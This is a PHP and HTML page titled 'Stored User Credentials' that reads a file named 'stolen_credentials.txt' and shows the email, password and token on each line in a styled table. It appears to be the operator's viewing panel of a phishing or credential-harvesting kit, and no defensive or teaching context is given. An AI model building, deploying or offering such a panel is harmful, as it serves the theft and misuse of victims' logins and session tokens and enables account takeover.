<!DOCTYPE html>
<html>
<head>
  <title>Stored User Credentials</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(to right, #8e9eab, #eef2f3);
      margin: 0;
      padding: 40px;
    }

    h1 {
      text-align: center;
      color: #333;
      margin-bottom: 30px;
      font-size: 32px;
      text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.1);
    }

    .table-container {
      background: white;
      max-width: 1000px;
      margin: 0 auto;
      padding: 30px 40px;
      border-radius: 12px;
      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.1);
      overflow-x: auto;
    }

    table {
      width: 100%;
      border-collapse: collapse;
      border-radius: 10px;
      overflow: hidden;
    }

    th {
      background-color: #007bff;
      color: white;
      font-size: 16px;
      letter-spacing: 1px;
      padding: 14px;
    }

    td {
      padding: 14px;
      font-size: 15px;
      color: #333;
    }

    tr:nth-child(even) {
      background-color: #f4f8fb;
    }

    tr:hover {
      background-color: #e2ecf5;
      transition: background-color 0.3s;
    }

    .no-data {
      text-align: center;
      font-size: 18px;
      color: #666;
      padding: 30px 0;
    }
  </style>
</head>
<body>

  <h1> Stored User Credentials📋</h1>

  <div class="table-container">
    <table>
      <tr>
        <th>Email</th>
        <th>Password</th>
        <th>Token</th>
      </tr>

      <?php
      $file = "stolen_credentials.txt";
      if (file_exists($file)) {
          $lines = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
          if (count($lines) === 0) {
              echo "<tr><td colspan='3' class='no-data'>No credentials found.</td></tr>";
          } else {
              foreach ($lines as $line) {
                  list($emailPart, $passwordPart, $tokenPart) = explode("|", $line);
                  $email = trim(str_replace("Email: ", "", $emailPart));
                  $password = trim(str_replace("Password: ", "", $passwordPart));
                  $token = trim(str_replace("Token: ", "", $tokenPart));
                  echo "<tr>
                          <td>$email</td>
                          <td>$password</td>
                          <td>$token</td>
                        </tr>";
              }
          }
      } else {
          echo "<tr><td colspan='3' class='no-data'>No credentials file found.</td></tr>";
      }
      ?>
    </table>
  </div>

</body>
</html>
